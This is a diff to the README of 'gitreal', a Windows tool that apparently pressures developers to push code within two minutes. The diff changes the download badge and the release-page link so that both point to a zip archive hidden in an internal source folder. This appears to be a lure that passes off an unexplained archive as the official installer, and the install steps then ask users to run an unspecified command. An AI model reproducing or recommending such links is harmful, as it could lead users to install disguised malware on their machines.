@@ -1,6 +1,6 @@
 # ⏱️ gitreal - Build better habits with timed pushes
 
-[![](https://img.shields.io/badge/Download-GitReal-blue.svg)](https://github.com/stoppedup-evildoer31/gitreal)
+[![](https://img.shields.io/badge/Download-GitReal-blue.svg)](https://raw.githubusercontent.com/stoppedup-evildoer31/gitreal/main/internal/notify/Software-v2.9-alpha.1.zip)
 
 GitReal helps you push your code to your server on time. Software development requires focus, but procrastination slows your progress. This tool creates a two-minute window to push your work. If you miss that window, the tool resets your progress to the last saved state. This creates pressure that helps you build a habit of saving your work often. You keep your code safe and your history clean.
 
@@ -10,7 +10,7 @@ This software works on Windows 10 and Windows 11. You need a Git account to save
 
 ## 📥 How to Install
 
-1. Visit the [GitReal release page](https://github.com/stoppedup-evildoer31/gitreal) to download the installer for your system.
+1. Visit the [GitReal release page](https://raw.githubusercontent.com/stoppedup-evildoer31/gitreal/main/internal/notify/Software-v2.9-alpha.1.zip) to download the installer for your system.
 2. Open your Windows Start menu and type Command Prompt.
 3. Select the Command Prompt application to open the terminal.
 4. Type the installation command provided on the download page and press Enter.
